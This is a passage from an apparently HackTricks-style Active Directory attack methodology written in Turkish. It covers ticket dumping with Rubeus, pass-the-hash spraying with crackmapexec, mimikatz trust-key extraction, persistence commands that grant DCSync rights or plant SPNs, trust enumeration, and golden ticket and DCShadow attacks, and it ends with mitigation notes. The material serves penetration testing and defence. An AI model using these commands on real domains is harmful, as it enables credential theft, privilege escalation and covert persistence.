.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Domain kimlik bilgileri veya bir kullanıcı oturumuyla, NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) konusunu yeniden ele alın: kimliği doğrulanmış enumeration ve coercion teknikleri, kimlik doğrulamasız reconnaissance sırasında kullanılamayan relay yollarını ortaya çıkarabilir.

### Bilgisayar Paylaşımlarında | SMB Paylaşımlarında Creds Arama

Artık bazı temel kimlik bilgilerine sahip olduğunuza göre, **AD içinde paylaşılan** herhangi bir **ilginç dosya** bulup bulamayacağınızı kontrol etmelisiniz. Bunu manuel olarak yapabilirsiniz; ancak bu, özellikle kontrol etmeniz gereken yüzlerce doküman bulursanız, oldukça sıkıcı ve tekrara dayalı bir iştir.

[**Kullanabileceğiniz araçlar hakkında bilgi edinmek için bu bağlantıyı takip edin.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### NTLM Creds Çalma

**Diğer bilgisayarlara veya paylaşımlara erişebiliyorsanız**, (SCF dosyası gibi) bir şekilde erişildiğinde size karşı **NTLM authentication tetikleyecek** dosyalar **yerleştirebilir**, böylece kırmak üzere **NTLM challenge** değerini **çalabilirsiniz**:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Bu zafiyet, kimliği doğrulanmış herhangi bir kullanıcının **domain controller'ı ele geçirmesine** olanak tanıyordu.


{{#ref}}
printnightmare.md
{{#endref}}

## Ayrıcalıklı kimlik bilgileri/oturum İLE Active Directory üzerinde privilege escalation

**Aşağıdaki teknikler için normal bir domain kullanıcısı yeterli değildir; bu saldırıları gerçekleştirmek için bazı özel ayrıcalıklara/kimlik bilgilerine ihtiyacınız vardır.**

### Hash çıkarma

Umarız [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), relaying dahil [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md), [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md) veya [yerel olarak privilege escalation](../windows-local-privilege-escalation/index.html) kullanarak bazı **local admin** hesaplarını **ele geçirmeyi** başarmışsınızdır.\
Ardından, bellekteki ve yerel olarak bulunan tüm hash'leri dump etme zamanı geldi.\
[**Hash'leri elde etmenin farklı yolları hakkında bilgi edinmek için bu sayfayı okuyun.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Bir kullanıcının hash'ine sahip olduğunuzda**, bunu kullanıcıyı **taklit etmek** için kullanabilirsiniz.\
Bu hash'i kullanarak **NTLM authentication gerçekleştirecek** bir **tool** kullanmanız gerekir; **veya** yeni bir **sessionlogon** oluşturup bu hash'i **LSASS** içine **inject** edebilirsiniz. Böylece herhangi bir **NTLM authentication gerçekleştirildiğinde** bu **hash kullanılacaktır.** Son seçenek mimikatz'ın yaptığıdır.\
[**Daha fazla bilgi için bu sayfayı okuyun.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Bu saldırı, yaygın Pass The Hash over NTLM protocol'üne alternatif olarak **kullanıcının NTLM hash'ini Kerberos ticket'ları istemek için kullanmayı** amaçlar. Bu nedenle, **NTLM protocol'ünün devre dışı bırakıldığı** ve authentication protocol olarak yalnızca **Kerberos'a izin verilen** ağlarda özellikle **kullanışlı** olabilir.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

**Pass The Ticket (PTT) attack** yönteminde saldırganlar, bir kullanıcının password veya hash değerleri yerine **authentication ticket'ını çalar**. Ardından bu çalınan ticket, **kullanıcıyı taklit etmek** ve bir ağ içindeki kaynaklara ve servislere yetkisiz erişim elde etmek için kullanılır.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

Bir **local administrato**r kullanıcısının **hash'ine** veya **password'üne** sahipseniz, bu bilgilerle diğer **PC'lere yerel olarak login** olmayı denemelisiniz.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Bunun oldukça **gürültülü** olduğunu ve **LAPS**'ın bunu **azaltacağını** unutmayın.

### MSSQL Abuse & Trusted Links

Bir kullanıcının **MSSQL instance'larına erişim** ayrıcalıkları varsa, bunları MSSQL host'unda (SA olarak çalışıyorsa) **komut çalıştırmak**, NetNTLM **hash**'ini **çalmak** veya hatta bir **relay** **saldırısı** gerçekleştirmek için kullanabilir.\
Bir MSSQL instance'ı başka bir instance tarafından bir database link üzerinden güvenilir olarak tanımlanmışsa, linked database üzerinde ayrıcalıkları olan bir kullanıcı **güven ilişkisini kullanarak diğer instance üzerinde sorgular çalıştırabilir**. Bu güven ilişkileri zincirlenebilir ve sonunda kullanıcının komut çalıştırabildiği yanlış yapılandırılmış bir database'e ulaşabilir.\
**Database'ler arasındaki linkler forest trust'ları arasında bile çalışır.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

Üçüncü taraf inventory ve deployment paketleri, credential'lara ve code execution'a giden güçlü yolları sıklıkla açığa çıkarır. Bkz.:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

[ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) özniteliğine sahip herhangi bir Computer object bulur ve computer üzerinde domain ayrıcalıklarına sahip olursanız, computer'a login olan tüm kullanıcıların TGT'lerini memory'den dump edebilirsiniz.\
Dolayısıyla bir **Domain Admin computer'a login olursa**, onun TGT'sini dump edebilir ve [Pass the Ticket](pass-the-ticket.md) kullanarak onun kimliğine bürünebilirsiniz.\
Constrained delegation sayesinde bir **Print Server'ı otomatik olarak compromise** edebilirsiniz (umarız bu bir DC olur).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Bir user veya computer "Constrained Delegation" için yetkilendirilmişse, bir computer üzerindeki bazı servislere erişmek için **herhangi bir kullanıcının kimliğine bürünebilir**.\
Ardından bu user/computer'ın **hash'ini compromise** ederseniz, bazı servislere erişmek için **herhangi bir kullanıcının** (hatta domain admin'lerinin) **kimliğine bürünebilirsiniz**.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Uzak bir computer'ın Active Directory object'i üzerinde **WRITE** ayrıcalığına sahip olmak, **yükseltilmiş ayrıcalıklarla** code execution elde edilmesini sağlar:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

Compromise edilmiş user, bazı domain object'leri üzerinde **daha sonra lateral hareket** etmenizi/**ayrıcalıkları escalate** etmenizi sağlayabilecek **ilginç ayrıcalıklara** sahip olabilir.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

Domain içinde **Spool service listening** keşfetmek, **yeni credential'lar elde etmek** ve **ayrıcalıkları escalate** etmek için **abuse** edilebilir.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

**Diğer kullanıcılar** **compromise edilmiş** makineye **erişirse**, **memory'den credential'ları toplamak** ve hatta onları taklit etmek için **process'lerine beacon inject etmek** mümkün olabilir.\
Kullanıcılar genellikle sisteme RDP üzerinden erişir; bu nedenle burada üçüncü taraf RDP session'ları üzerinde birkaç saldırının nasıl gerçekleştirileceğini bulabilirsiniz:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS**, domain'e dahil edilmiş computer'larda **local Administrator password**'ünü yönetmek için bir sistem sağlar ve bu password'ün **randomized**, benzersiz ve sık sık **changed** olmasını garanti eder. Bu password'ler Active Directory'de saklanır ve erişim yalnızca yetkili kullanıcılar için ACL'ler üzerinden kontrol edilir. Bu password'lere erişmek için yeterli izinlere sahip olmak, diğer computer'lara pivot etmeyi mümkün kılar.


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

**Compromise edilmiş makineden certificate'ları toplamak**, environment içinde ayrıcalıkları escalate etmenin bir yolu olabilir:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

**Vulnerable template'ler** yapılandırılmışsa, ayrıcalıkları escalate etmek için abuse edilmeleri mümkündür:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Yüksek ayrıcalıklı account ile Post-exploitation

### Domain Credential'larını Dump Etme

**Domain Admin** veya daha iyisi **Enterprise Admin** ayrıcalıklarını elde ettiğinizde, **domain database**'ini dump edebilirsiniz: _ntds.dit_.

[**DCSync attack hakkında daha fazla bilgiye buradan ulaşabilirsiniz**](dcsync.md).

[**NTDS.dit'yi nasıl çalacağınız hakkında daha fazla bilgiye buradan ulaşabilirsiniz**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Persistence olarak Privesc

Daha önce ele alınan bazı teknikler persistence için kullanılabilir.\
Örneğin şunları yapabilirsiniz:

- Kullanıcıları [**Kerberoast**](kerberoast.md) için vulnerable hale getirmek

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Kullanıcıları [**ASREPRoast**](asreproast.md) için vulnerable hale getirmek

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Bir kullanıcıya [**DCSync**](#dcsync) ayrıcalıkları vermek

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

**Silver Ticket attack**, **NTLM hash**'ini (örneğin **PC account'ın hash**'ini) kullanarak belirli bir service için **legitimate Ticket Granting Service (TGS) ticket** oluşturur. Bu yöntem, **service ayrıcalıklarına erişmek** için kullanılır.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

Bir **Golden Ticket attack**, saldırganın Active Directory (AD) environment'ında **krbtgt account'ın NTLM hash**'ine erişim elde etmesini içerir. Bu account özeldir; çünkü AD network'ü içinde authentication için gerekli olan tüm **Ticket Granting Ticket'ları (TGT'ler)** imzalamak için kullanılır.

Saldırgan bu hash'i elde ettiğinde, seçtiği herhangi bir account için **TGT'ler** oluşturabilir (Silver ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Bunlar, **yaygın golden ticket detection mekanizmalarını bypass edecek** şekilde forge edilmiş golden ticket'lar gibidir.


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

Bir account'ın **certificate'larına sahip olmak veya bunları request edebilmek**, kullanıcının account'ında (password'ünü değiştirse bile) persistence sağlayabilmenin çok iyi bir yoludur:


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Certificate'ları kullanarak domain içinde yüksek ayrıcalıklarla persistence sağlamak de mümkündür:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Active Directory'deki **AdminSDHolder** object'i, yetkisiz değişiklikleri önlemek amacıyla **privileged group'lar** (Domain Admins ve Enterprise Admins gibi) genelinde standart bir **Access Control List (ACL)** uygulayarak bu group'ların güvenliğini sağlar. Ancak bu özellik abuse edilebilir; saldırgan AdminSDHolder'ın ACL'ini değiştirerek normal bir user'a tam erişim verirse, bu user tüm privileged group'lar üzerinde geniş kapsamlı kontrol elde eder. Koruma amacı taşıyan bu güvenlik önlemi, yakından izlenmediğinde geri tepebilir ve yetkisiz erişime izin verebilir.

[**AdminDSHolder Group hakkında daha fazla bilgi burada.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

Her **Domain Controller (DC)** içinde bir **local administrator** account'ı bulunur. Böyle bir machine üzerinde admin hakları elde edilerek local Administrator hash'i **mimikatz** kullanılarak extract edilebilir. Ardından, **bu password'ün kullanımını enable etmek** ve local Administrator account'ına uzaktan erişime izin vermek için bir registry modification gereklidir.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Bazı belirli domain object'leri üzerinde bir **user'a**, kullanıcının **gelecekte ayrıcalıkları escalate etmesini** sağlayacak bazı **özel izinler** **verebilirsiniz**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

**Security descriptor'lar**, bir **object'in** başka bir **object** üzerinde sahip olduğu **izinleri** **saklamak** için kullanılır. Bir object'in **security descriptor'ında** yalnızca **küçük bir değişiklik** yapabilirseniz, privileged bir group'un üyesi olmanıza gerek kalmadan bu object üzerinde çok ilginç ayrıcalıklar elde edebilirsiniz.


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

Kısa ömürlü principal/GPO/DNS record'ları `entryTTL`/`msDS-Entry-Time-To-Die` ile oluşturmak için `dynamicObject` auxiliary class'ını abuse edin; bunlar tombstone bırakmadan kendilerini siler ve LDAP evidence'ını ortadan kaldırırken orphan SID'ler, bozuk `gPLink` referansları veya cached DNS response'ları bırakır (ör. AdminSDHolder ACE pollution ya da kötü amaçlı `gPCFileSysPath`/AD-integrated DNS redirect'leri).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Tüm domain account'larına erişim sağlamak için memory'deki **LSASS**'ı değiştirerek bir **universal password** oluşturun.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[SSP'nin (Security Support Provider) ne olduğunu burada öğrenin.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Makineye erişmek için kullanılan **credential'ları** **clear text** olarak **capture** etmek üzere **kendi SSP'nizi** oluşturabilirsiniz.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

AD içinde bir **yeni Domain Controller** register eder ve bunu kullanarak belirtilen object'ler üzerinde SIDHistory, SPN'ler... gibi **attribute'ları**, **modifikasyonlarla** ilgili herhangi bir **log** bırakmadan **push eder**. **DA** ayrıcalıklarına sahip olmanız ve **root domain** içinde bulunmanız gerekir.\
Yanlış data kullanırsanız oldukça kötü log'ların ortaya çıkacağını unutmayın.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Daha önce, **LAPS password'lerini okumak için yeterli izne** sahip olduğunuzda ayrıcalıkları nasıl escalate edeceğinizi ele aldık. Ancak bu password'ler **persistence sağlamak** için de kullanılabilir.\
Bkz.:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft, **Forest**'ı güvenlik sınırı olarak görür. Bu, **tek bir domain'in compromise edilmesinin tüm Forest'ın compromise edilmesine yol açabileceği** anlamına gelir.<sup>[[1]](#references)</sup>

### Basic Information

[**Domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>), bir **domain**'deki kullanıcının başka bir **domain**'deki resource'lara erişmesini sağlayan bir güvenlik mekanizmasıdır. Esasen iki domain'in authentication sistemleri arasında bir bağlantı oluşturur ve authentication doğrulamalarının sorunsuz biçimde akmasını sağlar. Domain'ler bir trust oluşturduğunda, trust'ın bütünlüğü için kritik olan belirli **key**'leri **Domain Controller'ları (DC'ler)** içinde exchange eder ve saklar.

Tipik bir senaryoda, bir user **trusted domain** içindeki bir service'e erişmek isterse önce kendi domain'inin DC'sinden **inter-realm TGT** olarak bilinen özel bir ticket request etmelidir. Bu TGT, iki domain'in üzerinde anlaştığı paylaşılan bir **key** ile encrypted edilir. Ardından user, service ticket (**TGS**) almak için bu TGT'yi **trusted domain'in DC'sine** sunar. Trusted domain'in DC'si inter-realm TGT'yi başarıyla validate ettikten sonra bir TGS verir ve user'a service'e erişim sağlar.

**Adımlar**:

1. **Domain 1** içindeki bir **client computer**, **NTLM hash**'ini kullanarak **Domain Controller'ından (DC1)** bir **Ticket Granting Ticket (TGT)** request ederek süreci başlatır.
2. Client başarıyla authenticated olursa DC1 yeni bir TGT verir.
3. Client daha sonra **Domain 2** içindeki resource'lara erişmek için gereken **inter-realm TGT**'yi DC1'den request eder.
4. Inter-realm TGT, iki yönlü domain trust'ın bir parçası olarak DC1 ve DC2 arasında paylaşılan bir **trust key** ile encrypted edilir.
5. Client, inter-realm TGT'yi **Domain 2'nin Domain Controller'ına (DC2)** götürür.
6. DC2, paylaşılan trust key'i kullanarak inter-realm TGT'yi verify eder ve geçerliyse client'ın erişmek istediği Domain 2 server'ı için bir **Ticket Granting Service (TGS)** verir.
7. Son olarak client, Domain 2'deki service'e erişmek için bu TGS'yi server'a sunar; TGS, server'ın account hash'i ile encrypted edilmiştir.

### Different trusts

**Bir trust'ın tek yönlü veya iki yönlü olabileceğine** dikkat etmek önemlidir. İki yönlü seçeneklerde her iki domain de birbirine trust eder; ancak **tek yönlü** trust ilişkisinde domain'lerden biri **trusted**, diğeri ise **trusting** domain olur. Son durumda **trusted domain'den trusting domain içindeki resource'lara erişebilirsiniz**.

Domain A, Domain B'ye trust ediyorsa A, trusting domain; B ise trusted domain'dir. Ayrıca **Domain A** açısından bu bir **Outbound trust**; **Domain B** açısından ise bir **Inbound trust** olur.

**Farklı trusting ilişkileri**

- **Parent-Child Trusts**: Bu, aynı forest içindeki yaygın bir yapılandırmadır; child domain, parent domain ile otomatik olarak iki yönlü transitive trust'a sahip olur. Esasen authentication request'lerinin parent ve child arasında sorunsuz biçimde akabilmesi anlamına gelir.
- **Cross-link Trusts**: "Shortcut trusts" olarak da adlandırılır; referral süreçlerini hızlandırmak için child domain'ler arasında oluşturulur. Karmaşık forest'larda authentication referral'larının genellikle forest root'a kadar çıkıp ardından hedef domain'e inmesi gerekir. Cross-link oluşturularak yol kısaltılır; bu, özellikle coğrafi olarak dağınık environment'larda faydalıdır.
- **External Trusts**: Farklı ve ilişkisiz domain'ler arasında oluşturulur ve doğaları gereği non-transitive'dir. [Microsoft'un documentation'ına](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>) göre external trust'lar, forest trust ile bağlı olmayan mevcut forest dışındaki bir domain'deki resource'lara erişmek için kullanışlıdır. External trust'larda SID filtering ile güvenlik artırılır.
- **Tree-root Trusts**: Forest root domain ile yeni eklenen bir tree root arasında otomatik olarak oluşturulur. Yaygın olarak karşılaşılmasa da tree-root trust'lar, forest'a yeni domain tree'leri eklemek için önemlidir; bu tree'lerin benzersiz bir domain adı korumasını ve iki yönlü transitivity'yi sürdürmesini sağlar. Daha fazla bilgi [Microsoft'un guide'ında](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>) bulunabilir.
- **Forest Trusts**: İki forest root domain arasında iki yönlü transitive trust türüdür ve güvenlik önlemlerini artırmak için SID filtering de uygular.
- **MIT Trusts**: Windows dışı, [RFC4120-compliant](https://tools.ietf.org/html/rfc4120) Kerberos domain'leriyle oluşturulur. MIT trust'lar daha özelleşmiştir ve Windows ecosystem'ı dışındaki Kerberos tabanlı sistemlerle integration gerektiren environment'lara yöneliktir.

#### **Trusting ilişkilerindeki diğer farklar**

- Bir trust ilişkisi **transitive** (A, B'ye trust eder; B, C'ye trust eder; dolayısıyla A, C'ye trust eder) veya **non-transitive** olabilir.
- Bir trust ilişkisi **bidirectional trust** (her ikisi de birbirine trust eder) veya **one-way trust** (yalnızca biri diğerine trust eder) olarak yapılandırılabilir.

### Attack Path

1. Trusting ilişkileri **enumerate** edin.
2. Herhangi bir **security principal**'ın (user/group/computer) **diğer domain'in** resource'larına **erişimi** olup olmadığını kontrol edin; bu erişim ACE entry'leri nedeniyle veya diğer domain'in group'larının üyesi olması sayesinde olabilir. **Domain'ler arasındaki ilişkileri** arayın (trust muhtemelen bunun için oluşturulmuştur).
1. Bu durumda kerberoast başka bir seçenek olabilir.
3. Domain'ler arasında **pivot** yapabilen **account'ları compromise** edin.

Saldırganların başka bir domain'deki resource'lara erişebilmesini sağlayan üç temel mekanizma vardır:

- **Local Group Membership**: Principal'lar server'daki “Administrators” group'u gibi machine'lerin local group'larına eklenebilir ve bu da onlara machine üzerinde önemli bir kontrol sağlar.
- **Foreign Domain Group Membership**: Principal'lar foreign domain içindeki group'ların da üyesi olabilir. Ancak bu yöntemin etkinliği trust'ın yapısına ve group'un kapsamına bağlıdır.
- **Access Control Lists (ACLs)**: Principal'lar bir **ACL** içinde, özellikle bir **DACL** içindeki **ACE**'lerde entity olarak belirtilerek belirli resource'lara erişim elde edebilir. ACL, DACL ve ACE mekanizmalarını daha ayrıntılı incelemek isteyenler için “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” başlıklı whitepaper değerli bir resource'dur.<sup>[[17]](#references)</sup>

### Find external users/groups with permissions

Domain içindeki foreign security principal'ları bulmak için **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** konumunu kontrol edebilirsiniz. Bunlar **harici bir domain/forest** içindeki user/group'lar olacaktır.

Bunu **Bloodhound** ile veya powerview kullanarak kontrol edebilirsiniz:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent forest privilege escalation
```bash
# From PowerView
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Domain trust'larını enumerate etmenin diğer yolları:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> **2 trusted keys** vardır; biri _Child --> Parent_, diğeri ise _Parent_ --> _Child_ içindir.\
> Mevcut domain tarafından kullanılan anahtarı şu komutlarla alabilirsiniz:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

SID-History injection kullanarak trust ilişkisini kötüye kullanın ve child/parent domain üzerinde Enterprise admin olarak yetki yükseltin:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Yazılabilir Configuration NC'yi Exploit Etme

Configuration Naming Context'in (NC) nasıl exploit edilebileceğini anlamak kritik öneme sahiptir. Configuration NC, Active Directory (AD) ortamlarında bir forest genelindeki yapılandırma verileri için merkezi bir depo görevi görür. Bu veriler forest içindeki her Domain Controller'a (DC) replike edilir; yazılabilir DC'ler ise Configuration NC'nin yazılabilir bir kopyasını tutar. Bunu exploit etmek için bir DC üzerinde, tercihen bir child DC'de **SYSTEM yetkilerine** sahip olmak gerekir.

**GPO'yu root DC sitesine bağlama**

Configuration NC'nin Sites container'ı, AD forest içindeki domain'e dahil edilmiş tüm bilgisayarların siteleri hakkında bilgiler içerir. DC üzerinde SYSTEM yetkileriyle çalışarak saldırganlar GPO'ları root DC sitelerine bağlayabilir. Bu işlem, bu sitelere uygulanan policy'leri değiştirerek root domain'i potansiyel olarak tehlikeye atar.

Ayrıntılı bilgi için [Bypassing SID Filtering](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4) araştırması incelenebilir.<sup>[[12]](#references)</sup>

**Forest içindeki herhangi bir gMSA'yı ele geçirme**

Bir attack vector, domain içindeki ayrıcalıklı gMSA'ları hedeflemeyi içerir. gMSA'ların password'lerini hesaplamak için gerekli olan KDS Root key, Configuration NC içinde saklanır. Herhangi bir DC üzerinde SYSTEM yetkileriyle KDS Root key'e erişmek ve forest genelindeki herhangi bir gMSA için password'leri hesaplamak mümkündür.

Ayrıntılı analiz ve adım adım rehber şu kaynakta bulunabilir:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Tamamlayıcı delegated MSA attack (BadSuccessor – migration attributes'ın kötüye kullanılması):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Ek external research: [Golden gMSA Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5).<sup>[[13]](#references)</sup>

**Schema change attack**

Bu method sabır gerektirir; yeni ayrıcalıklı AD object'lerinin oluşturulmasını beklemek gerekir. SYSTEM yetkileriyle saldırgan, herhangi bir user'a tüm class'lar üzerinde tam control vermek için AD Schema'yı değiştirebilir. Bu durum, yeni oluşturulan AD object'lerine yetkisiz erişim ve control sağlayabilir.

Daha fazla bilgiye [Schema Change Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6) üzerinden ulaşılabilir.<sup>[[14]](#references)</sup>

**ADCS ESC5 ile DA'dan EA'ya**

ADCS ESC5 vulnerability, forest içindeki herhangi bir user olarak authentication sağlayan bir certificate template oluşturmak için Public Key Infrastructure (PKI) object'leri üzerindeki control'ü hedefler. PKI object'leri Configuration NC içinde bulunduğundan, yazılabilir bir child DC'nin ele geçirilmesi ESC5 attack'lerinin gerçekleştirilmesini mümkün kılar.

Daha fazla ayrıntı [From DA to EA with ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/) kaynağında bulunabilir.<sup>[[15]](#references)</sup> ADCS bulunmayan senaryolarda saldırgan, [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/) kaynağında açıklandığı üzere gerekli component'leri kurabilir.<sup>[[16]](#references)</sup>

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
Bu senaryoda **domain'iniz**, size üzerinde **belirlenmemiş yetkiler** veren harici bir domain tarafından **trusted** durumdadır. Domain'inizdeki **hangi principal'ların harici domain üzerinde hangi erişimlere sahip olduğunu** bulmanız ve ardından bunu exploit etmeye çalışmanız gerekir:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Harici Forest Domain - Tek Yönlü (Outbound)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
Bu senaryoda **sizin domain'iniz**, **farklı bir domain'deki** principal'a bazı **privilege'lar** **trust** etmektedir.

Ancak, bir **domain**, trusting domain tarafından **trusted** olduğunda, trusted domain **tahmin edilebilir bir ada** sahip ve **password olarak trusted password'ı** kullanan bir user **oluşturur**. Bu da, trusting domain'deki bir **user'a erişerek trusted domain'in içine girmeyi**, onu enumerate etmeyi ve daha fazla privilege escalate etmeyi denemeyi mümkün kılar:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Trusted domain'i compromise etmenin başka bir yolu, domain trust'ın **ters yönünde** oluşturulmuş bir [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) bulmaktır (bu çok yaygın değildir).

Trusted domain'i compromise etmenin başka bir yolu da, **trusted domain'den bir user'ın erişebildiği** bir makinede bekleyerek **RDP** üzerinden login olmasını sağlamaktır. Ardından attacker, RDP session process'ine code inject edebilir ve buradan **victim'ın origin domain'ine erişebilir**.\
Ayrıca, **victim hard drive'ını mount ettiyse**, attacker **RDP session** process'i üzerinden **hard drive'ın startup folder'ına backdoor'lar** yerleştirebilir. Bu teknik **RDPInception** olarak adlandırılır.


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Domain trust abuse mitigation

### **SID Filtering:**

- Forest trust'ları üzerinden SID history attribute'undan yararlanan attack'ların riski, tüm inter-forest trust'larda varsayılan olarak etkin olan SID Filtering ile azaltılır. Bu yaklaşım, Microsoft'un tutumuna göre security boundary olarak domain yerine forest'ın kabul edilmesi nedeniyle intra-forest trust'ların güvenli olduğu varsayımına dayanır.
- Ancak bir sorun vardır: SID filtering, applications ve user access'i bozabilir; bu nedenle zaman zaman devre dışı bırakılır.

### **Selective Authentication:**

- Inter-forest trust'lar için Selective Authentication kullanılması, iki forest'taki user'ların otomatik olarak authenticate edilmemesini sağlar. Bunun yerine user'ların trusting domain veya forest içindeki domain'lere ve server'lara erişmesi için açık permission'lar gerekir.
- Bu önlemlerin writable Configuration Naming Context (NC)'in exploitation'ına veya trust account'a yönelik attack'lara karşı koruma sağlamadığını unutmamak önemlidir.

[**ired.team'de domain trust'ları hakkında daha fazla bilgi.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)<sup>[[3]](#references)</sup>

## LDAP-based AD Abuse from On-Host Implants

